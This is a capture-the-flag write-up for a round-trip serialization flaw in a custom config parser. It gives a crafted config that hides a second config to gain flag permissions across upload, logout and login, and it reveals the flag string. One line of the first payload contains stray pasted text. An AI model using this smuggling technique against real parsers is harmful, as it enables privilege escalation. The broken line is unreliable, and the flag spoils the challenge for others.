# Nom du défi

## Write-up

This is a round trip serialization vulnerability. What should be observed is at l.205 in config.go, ' and " are decoded as start quotes, but the WriteQuote function at l.74 in config.go only writes them as ".

Since their is a difference in serializing and deserializing, if the the tool deserialize --> check validity -> serialize -> deserialize a config, then we might be able to create a config that would be invalid in the check validity step, but is only after the second deserialize.
The tool deserialize a config on '/api/upload_config', serialize on '/api/logout' and deserialize again on '/api/login'.

We want the Flag permissions to view the flag. Here is a config which uses the what_a_website property to hold another config using the 2 quotes ('") and finishes with a comment start. On first deserialize, the parser consider what_a_website as a simple string.

```yaml
::userℹ️::
my♥️🍏a
what_a_website🍏b'"
🍎
::permissions::
write🍏True
read🍏False
flag🚩🍏True
🍎
::✍️signature✍️
method🍏sha256
hash🍏%s
🍎
::URL::s start quotes, but the Writ
::endpoint::🍏c
💬'
🍎
::permissions::
write🍏True
read🍏False
flag🚩🍏False
🍎
::✍️signature✍️
method🍏sha256
hash🍏%s
🍎
::URL::
::endpoint::🍏c
```

After serialization tho, it would look like this:

```yaml
::userℹ️::
my♥️🍏a
what_a_website🍏b""
🍎
::permissions::
write🍏True
read🍏False
flag🚩🍏True
🍎
::✍️signature✍️
method🍏sha256
hash🍏%s
🍎
::URL::
::endpoint::🍏c
💬'
🍎
::permissions::
write🍏True
read🍏False
flag🚩🍏False
🍎
::✍️signature✍️
method🍏sha256
hash🍏%s
🍎
::URL::
::endpoint::🍏c
```

Where what_a_website value is b with an empty quote and the end of the config is escaped using the comment.

Finally, we need to fix the hash function which need to be valid for both config.

## References

- https://portswigger.net/research/saml-roulette-the-hacker-always-wins
- https://mattermost.com/blog/securing-xml-implementations-across-the-web/

## Flag

`flag-R0undTripS3ri41iz4ti0nIsW4k_ee696fb1`
